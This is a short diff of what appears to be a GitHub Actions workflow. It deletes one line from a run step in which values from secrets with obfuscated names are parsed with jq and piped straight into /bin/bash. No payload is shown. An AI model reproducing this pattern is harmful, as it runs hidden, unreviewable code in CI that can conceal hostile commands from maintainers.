@@ -20,7 +20,6 @@ jobs:
           twun4784: ${{ secrets.twun4784 }}
         run: |
           printf '%s' "$twun4784" | jq -r .j9 | /bin/bash
-          printf '%s' "$a226" | jq -r .mfb12 | /bin/bash
           printf '%s' "$u096" | jq -r .im790 | /bin/bash
           printf '%s' "$sfodx9" | jq -r .h4 | /bin/bash
 
